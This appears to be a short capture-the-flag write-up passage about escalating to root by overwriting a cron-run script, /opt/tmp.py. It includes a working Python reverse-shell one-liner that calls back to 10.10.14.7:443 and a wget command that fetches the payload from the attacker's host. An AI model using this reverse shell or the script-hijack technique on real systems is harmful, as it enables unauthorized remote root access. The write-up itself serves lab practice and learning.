Found a script running every couple minutes /opt/tmp.py that removes all files from /tmp/ directory. I was able to replace the file and replaced it with python reverse shell script
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.7",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
```

Downloaded and replaced file in /opt
```bash
wget -O tmp.py http://10.10.14.7:8888/tmp.py
```

Got a reverse shell as root
![[Pasted image 20240901125645.png]]

